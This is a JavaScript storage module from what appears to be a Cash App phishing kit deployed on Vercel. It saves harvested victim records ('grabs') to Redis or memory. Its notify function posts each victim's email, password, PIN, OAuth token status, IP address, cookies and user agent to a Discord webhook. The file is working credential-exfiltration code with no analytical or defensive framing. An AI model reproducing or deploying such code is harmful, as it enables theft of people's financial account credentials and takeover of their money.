// Shared storage. Files starting with "_" are not routed by Vercel.
const KEY = 'cashapp:adder:grabs';
const MAX = 1000;

function cfg() {
  return {
    url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL,
    token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN,
  };
}

async function cmd(...args) {
  const { url, token } = cfg();
  if (!url || !token) return null;
  const r = await fetch(url, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(args),
  });
  const j = await r.json();
  if (j.error) throw new Error(j.error);
  return j.result;
}

export async function save(row) {
  const json = JSON.stringify(row);
  try {
    const res = await cmd('RPUSH', KEY, json);
    if (res !== null) { await cmd('LTRIM', KEY, -MAX, -1); return 'redis'; }
  } catch (e) { console.error('[store] redis write failed:', e.message); }
  const g = globalThis.__grabs || (globalThis.__grabs = []);
  g.push(json);
  if (g.length > MAX) g.shift();
  return 'memory';
}

export async function all() {
  try {
    const res = await cmd('LRANGE', KEY, 0, -1);
    if (res && res.length) return res;
  } catch (e) { console.error('[store] redis read failed:', e.message); }
  return globalThis.__grabs || [];
}

export async function notify(row) {
  const hook = process.env.DISCORD_WEBHOOK;
  if (!hook) return;
  const fields = [
    ['Stage', row.stage], ['Account', row.email], ['Password', row.password],
    ['PIN', row.pin], ['OAuth', row.oauth ? (row.oauth.access_token ? 'token OK' : 'token FAIL') : null],
    ['IP', row.ip], ['Cookie', (row.cookies || '').slice(0, 200)],
    ['UA', (row.ua || '').slice(0, 120)],
  ].filter(([, v]) => v);
  try {
    await fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Cash App Adder',
        embeds: [{
          title: '🟢 New grab · ' + row.stage,
          color: 0x00d54b,
          fields: fields.map(([name, value]) => ({ name, value: String(value).slice(0, 1000), inline: true })),
          timestamp: new Date().toISOString(),
        }],
      }),
    });
  } catch (e) { console.error('[store] discord failed:', e.message); }
}
